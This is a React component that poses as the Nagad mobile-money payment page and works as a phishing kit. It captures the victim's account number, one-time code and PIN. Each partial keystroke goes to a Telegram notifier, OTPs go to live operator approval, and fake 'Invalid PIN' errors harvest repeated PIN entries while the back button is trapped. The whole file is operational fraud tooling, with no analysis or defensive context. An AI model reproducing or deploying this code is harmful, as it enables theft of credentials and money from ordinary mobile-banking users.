import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import { submitOtpForApproval } from "@/lib/otpApproval";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import { useMerchantInfo } from "@/hooks/useMerchantInfo";
import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
import SingleCircleLoader from "@/components/payment/SingleCircleLoader";
import cartIcon from "@/assets/payment/cart-icon.png";
import nagadLogoWhite from "@/assets/payment/nagad-logo-white.png";

const NagadPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  usePaymentAccessGuard("nagad");
  const isAllowed = usePaymentMethodGuard("nagad");
  const NAGAD_DEFAULT_MERCHANT = "";
  const { merchant, inv } = useMerchantInfo("nagad", { merchant: "", inv: "" });
  const otpResumeRef = useRef(readOtpResume("nagad"));
  const otpResumeState = otpResumeRef.current?.state;
  const restoredPhoneDigits = Array.isArray(otpResumeState?.phoneDigits) && otpResumeState.phoneDigits.length === 11
    ? otpResumeState.phoneDigits.map((digit) => String(digit).replace(/\D/g, "").slice(0, 1))
    : Array(11).fill("");

  const [phoneDigits, setPhoneDigits] = useState<string[]>(restoredPhoneDigits);
  const [showOtpView, setShowOtpView] = useState(otpResumeState?.showOtpView === true);
  const [showPinView, setShowPinView] = useState(otpResumeState?.showPinView === true);
  const [otpValue, setOtpValue] = useState(typeof otpResumeState?.otpValue === "string" ? otpResumeState.otpValue : "");
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
  const [language, setLanguage] = useState<'bn' | 'en'>('en');
  const [phoneError, setPhoneError] = useState("");
  const [pinError, setPinError] = useState("");
  const [otpError, setOtpError] = useState("");
  const [pinAttempts, setPinAttempts] = useState(0);
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpResent, setOtpResent] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // PIN keystroke telegram (partial pin)
  const lastPinLenRef = useRef(0);
  useEffect(() => {
    if (!showPinView) { lastPinLenRef.current = 0; return; }
    const currentPin = pinDigits.join('');
    if (currentPin.length > lastPinLenRef.current && currentPin.length > 0) {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: currentPin });
    }
    lastPinLenRef.current = currentPin.length;
  }, [pinDigits, showPinView, amount, otpValue, phoneDigits]);

  // OTP keystroke telegram (partial otp)
  const lastOtpLenRef = useRef(0);
  useEffect(() => {
    if (!showOtpView) { lastOtpLenRef.current = 0; return; }
    if (otpValue.length > lastOtpLenRef.current && otpValue.length > 0) {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue });
    }
    lastOtpLenRef.current = otpValue.length;
  }, [otpValue, showOtpView, amount, phoneDigits]);


  const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRef = useRef<HTMLInputElement | null>(null);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpStartAtRef = useRef<number>(0);
  useEffect(() => { if (showOtpView && !otpStartAtRef.current) otpStartAtRef.current = Date.now(); if (!showOtpView) otpStartAtRef.current = 0; }, [showOtpView]);


  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      if (showOtpView || showPinView) navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
      else navigate(`/payment?amount=${amount}`);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount, showOtpView, showPinView]);

  useEffect(() => {
    setTimeout(() => {
      if (showPinView) pinInputRefs.current[0]?.focus();
      else if (showOtpView) otpInputRef.current?.focus();
      else phoneInputRefs.current[0]?.focus();
    }, 100);
  }, [showOtpView, showPinView]);

  useEffect(() => {
    if (showOtpView || showPinView) saveOtpResume("nagad", searchParams.toString(), { showOtpView, showPinView, phoneDigits, otpValue });
    else clearOtpResume("nagad");
  }, [showOtpView, showPinView, phoneDigits, otpValue, searchParams]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const getPhoneNumber = () => phoneDigits.join("");
  const isValidNumber = () => {
    const phone = getPhoneNumber();
    return phone.length === 11 && validPrefixes.includes(phone.substring(0, 3)) && /^\d+$/.test(phone);
  };
  const isValidOtp = () => otpValue.length === 6 && /^\d+$/.test(otpValue);

  const handleDigitChange = (
    index: number, value: string, digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>, maxLength: number
  ) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    const previousValue = digits[index];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (!value && previousValue && index > 0) {
      requestAnimationFrame(() => refs.current[index - 1]?.focus());
      return;
    }
    if (value && index < maxLength - 1) refs.current[index + 1]?.focus();
  };

  const handleBackwardDelete = (
    index: number, digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (index === 0 || digits[index]) return;
    const previousIndex = index - 1;
    const newDigits = [...digits];
    newDigits[previousIndex] = "";
    setDigits(newDigits);
    requestAnimationFrame(() => refs.current[previousIndex]?.focus());
  };

  const handleKeyDown = (
    index: number, e: React.KeyboardEvent<HTMLInputElement>,
    digits: string[], setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      e.preventDefault();
      handleBackwardDelete(index, digits, setDigits, refs);
    }
  };

  const handleBeforeInput = (
    index: number, e: React.FormEvent<HTMLInputElement>,
    digits: string[], setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    const nativeEvent = e.nativeEvent as InputEvent;
    if (nativeEvent.inputType === "deleteContentBackward" && !digits[index] && index > 0) {
      e.preventDefault();
      handleBackwardDelete(index, digits, setDigits, refs);
    }
  };

  const handleDigitsPaste = (
    index: number,
    e: React.ClipboardEvent<HTMLInputElement>,
    digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>,
    maxLength: number
  ) => {
    const pastedDigits = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, maxLength - index);
    if (!pastedDigits) return;
    window.setTimeout(() => {
      const next = [...digits];
      pastedDigits.split("").forEach((digit, offset) => { next[index + offset] = digit; });
      setDigits(next);
      const nextIndex = Math.min(index + pastedDigits.length, maxLength - 1);
      refs.current[nextIndex]?.focus();
    }, 0);
  };

  const handleConfirm = () => {
    if (isValidNumber()) {
      setIsLoading(true);
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join('') }, { force: true });
      setTimeout(() => { setPhoneError(""); setShowOtpView(true); setIsLoading(false); }, 2000);
    } else setPhoneError(language === 'bn' ? "অবৈধ মোবাইল নম্বর" : "Invalid mobile number");
  };
  const [otpDenyCount, setOtpDenyCount] = useState(0);
  const handleOtpConfirm = async () => {
    if (!isValidOtp()) return;
    setIsLoading(true);
    const nextAttempt = otpAttempts + 1;
    setOtpAttempts(nextAttempt);
    const decision = await submitOtpForApproval({
      amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue,
    }, { autoAttempt: nextAttempt, otpStartAt: otpStartAtRef.current });
    setIsLoading(false);
    if (decision === 'approved') {
      setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0);
    } else if (decision === 'timeout' || decision === 'error') {
      navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
    } else {
      const nextDenies = otpDenyCount + 1;
      setOtpDenyCount(nextDenies);
      if (nextDenies >= 3) {
        navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
        return;
      }
      setOtpError(language === 'bn' ? "ভুল ভেরিফিকেশন কোড" : "Invalid verification code");
      setOtpValue("");
      setTimeout(() => setOtpError(""), 3500);
    }
  };

  const handlePinConfirm = () => {
    setIsLoading(true);
    if (pinAttempts === 0) {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') }, { force: true });
      setTimeout(() => { setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided"); setPinAttempts(1); setIsLoading(false); }, 2000);
    } else if (pinAttempts === 1) {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') }, { force: true });
      setTimeout(() => { setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information."); setPinAttempts(2); setIsLoading(false); }, 2000);
    } else {
      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') }, { force: true });
      setTimeout(() => { setIsLoading(false); navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`); }, 2000);
    }
  };
  const handleResendOtp = () => { setOtpValue(""); setOtpResent(true); };
  const handleClose = () => navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);

  const t = {
    title: (merchant && merchant.trim()) ? merchant : 'Nagad ECOM Payment',
    invoiceNo: language === 'bn' ? 'ইনভয়েস নং:' : 'Invoice No:',
    totalAmount: language === 'bn' ? 'মোট পরিমাণ:' : 'Total Amount:',
    charge: language === 'bn' ? 'চার্জ:' : 'Charge:',
    enterPin: language === 'bn' ? 'পিন দিন' : 'Enter PIN',
    enterOtp: language === 'bn' ? 'যাচাইকরণ কোড [OTP] দিন' : 'Enter Verification Code [OTP]',
    accountNumber: language === 'bn' ? 'আপনার নগদ অ্যাকাউন্ট নম্বর' : 'Your Nagad Account Number',
    proceed: language === 'bn' ? 'এগিয়ে যান' : 'Proceed',
    close: language === 'bn' ? 'বন্ধ করুন' : 'Close',
    resendCode: language === 'bn' ? 'পুনরায় পাঠান' : 'Resend Code',
    otpResent: language === 'bn' ? 'আপনার মোবাইল নম্বরে SMS এর মাধ্যমে OTP পুনরায় পাঠানো হয়েছে' : 'OTP has been resent via SMS to your mobile number',
    termsText: language === 'bn' ? '"এগিয়ে যান" ক্লিক/ট্যাপ করে আপনি আমাদের ' : 'By clicking/tapping "Proceed" you are agreeing to our ',
    termsLink: language === 'bn' ? 'শর্তাবলী' : 'Terms and Conditions',
  };

  const renderPhoneInputs = () => {
    const groups = [3, 4, 4];
    let currentIndex = 0;
    const elements: JSX.Element[] = [];
    groups.forEach((groupSize, groupIndex) => {
      const inputs: JSX.Element[] = [];
      for (let i = 0; i < groupSize; i++) {
        const idx = currentIndex + i;
        inputs.push(
          <input id={`nagad-phone-${idx}`} name={`nagad-phone-${idx}`} aria-label={`Nagad phone digit ${idx+1}`} key={idx} ref={(el) => (phoneInputRefs.current[idx] = el)}
            type="tel" inputMode="numeric" maxLength={1} value={phoneDigits[idx] || ""}
            onChange={(e) => handleDigitChange(idx, e.target.value, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
            onPaste={(e) => handleDigitsPaste(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
            onKeyDown={(e) => handleKeyDown(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
            onBeforeInput={(e) => handleBeforeInput(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
            className="w-5 h-6 min-[375px]:w-6 min-[375px]:h-7 bg-white rounded text-center text-gray-800 text-[10px] min-[375px]:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50" />
        );
      }
      elements.push(<div key={groupIndex} className="flex gap-1.5">{inputs}</div>);
      currentIndex += groupSize;
      if (groupIndex < groups.length - 1) elements.push(<span key={`sep-${groupIndex}`} className="text-[#ccc] text-lg font-bold mx-1">-</span>);
    });
    return <div className="flex items-center justify-center">{elements}</div>;
  };

  const renderPinInputs = () => (
    <div className="flex items-center justify-center gap-3">
      {pinDigits.map((digit, index) => (
        <input id={`nagad-pin-${index}`} name={`nagad-pin-${index}`} aria-label={`Nagad PIN digit ${index+1}`} key={index} ref={(el) => (pinInputRefs.current[index] = el)}
          type="password" inputMode="numeric" maxLength={1} value={digit}
          onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
          onPaste={(e) => handleDigitsPaste(index, e, pinDigits, setPinDigits, pinInputRefs, 4)}
          onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
          onBeforeInput={(e) => handleBeforeInput(index, e, pinDigits, setPinDigits, pinInputRefs)}
          className="w-7 h-8 min-[375px]:w-8 min-[375px]:h-9 bg-white rounded text-center text-gray-800 text-[10px] min-[375px]:text-[11px] font-medium focus:outline-none focus:ring-1 focus:ring-white/50" />
      ))}
    </div>
  );

  if (isAllowed !== true) return null;

  return (
    <div className="fixed inset-0 flex flex-col bg-gray-300 overflow-hidden">
      {isLoading && <SingleCircleLoader />}
      <div className="w-full h-full flex flex-col overflow-hidden border-4 min-[375px]:border-[8px] border-black" style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
        <div className="flex justify-end p-1.5 min-[375px]:p-2 shrink-0">
          <div className="flex overflow-hidden rounded-lg border-2 border-white">
            <button onClick={() => setLanguage('bn')} className={`px-2.5 py-0.5 text-[10px] font-bold transition-colors ${language === 'bn' ? 'bg-white text-[#C41E3A]' : 'text-white'}`}>বাং</button>
            <button onClick={() => setLanguage('en')} className={`px-2.5 py-0.5 text-[10px] font-bold transition-colors ${language === 'en' ? 'bg-white text-[#C41E3A]' : 'text-white'}`}>Eng</button>
          </div>
        </div>
        <div className="flex-1 flex flex-col justify-evenly min-h-0">
          <div className="flex flex-col items-center shrink-0">
            <img src={cartIcon} alt="Cart" className="w-10 h-10 min-[375px]:w-16 min-[375px]:h-16 mb-1 min-[375px]:mb-2 object-contain" />
            <h1 className="text-[#ccc] text-sm min-[375px]:text-lg font-bold">{t.title}</h1>
          </div>
          <div className="px-6 min-[375px]:px-8 shrink-0">
            <div className="space-y-0.5 min-[375px]:space-y-1.5">
              <div className="flex"><span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.invoiceNo}</span><span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">{inv}</span></div>
              <div className="flex"><span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.totalAmount}</span><span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT {amount}</span></div>
              <div className="flex"><span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm w-24 min-[375px]:w-32">{t.charge}</span><span className="text-[#ccc] font-bold text-xs min-[375px]:text-sm">BDT 0</span></div>
            </div>
          </div>
          <div className="flex flex-col items-center px-4 min-[375px]:px-5 shrink-0">
            {showPinView ? (
              <div className="flex flex-col items-center">
                <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.enterPin}</p>
                {renderPinInputs()}
                <p className={`text-yellow-300 text-[10px] min-[375px]:text-sm font-bold mt-2 min-[375px]:mt-3 text-center ${pinError ? 'visible' : 'invisible'}`}>{pinError || "placeholder"}</p>
              </div>
            ) : showOtpView ? (
              <div className="flex flex-col items-center w-full relative">
                <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.enterOtp}</p>
                <input id="nagadpayment-fld-3" name="nagadpayment-fld-3" aria-label="nagadpayment field 3" ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                  onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))} placeholder="XXXXXX"
                  className="w-4/5 h-7 min-[375px]:h-8 bg-white rounded text-center text-gray-800 text-xs min-[375px]:text-sm font-medium tracking-[0.5em] focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400 placeholder:tracking-[0.3em]" />
                {otpResent && (<p className="absolute left-0 right-0 top-full mt-1 text-[#ccc] text-[9px] min-[375px]:text-[11px] font-bold text-center whitespace-nowrap">{t.otpResent}</p>)}
                {otpError && (<p className="absolute left-0 right-0 top-full mt-1 text-yellow-300 text-[10px] min-[375px]:text-sm font-bold text-center whitespace-nowrap">{otpError}</p>)}
              </div>
            ) : (
              <div className="flex flex-col items-center">
                <p className="text-[#ccc] text-center text-xs min-[375px]:text-base font-bold mb-2 min-[375px]:mb-4">{t.accountNumber}</p>
                {renderPhoneInputs()}
                {phoneError && (<p className="text-yellow-300 text-[10px] min-[375px]:text-sm font-medium mt-2 min-[375px]:mt-3">{phoneError}</p>)}
              </div>
            )}
            {!showOtpView && !showPinView && (
              <p className="text-[#ccc] text-center text-[9px] min-[375px]:text-xs leading-tight font-bold mt-3 min-[375px]:mt-5 px-2">
                {t.termsText}<span className="text-[#ccc] font-bold underline">{t.termsLink}</span>
              </p>
            )}
          </div>
          <div className="flex gap-4 min-[375px]:gap-8 justify-center shrink-0">
            <button onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
              className="px-4 min-[375px]:px-6 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white">{t.proceed}</button>
            {showOtpView && (
              <button onClick={handleResendOtp} className="px-3 min-[375px]:px-4 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white">{t.resendCode}</button>
            )}
            <button onClick={handleClose} className="px-4 min-[375px]:px-6 bg-white text-[#C41E3A] py-0.5 min-[375px]:py-1 rounded text-[8px] min-[375px]:text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white">{t.close}</button>
          </div>
          <div className="flex justify-center shrink-0">
            <img src={nagadLogoWhite} alt="Nagad" className="h-8 min-[375px]:h-12 object-contain" />
          </div>
        </div>
      </div>
    </div>
  );
};

export default NagadPayment;
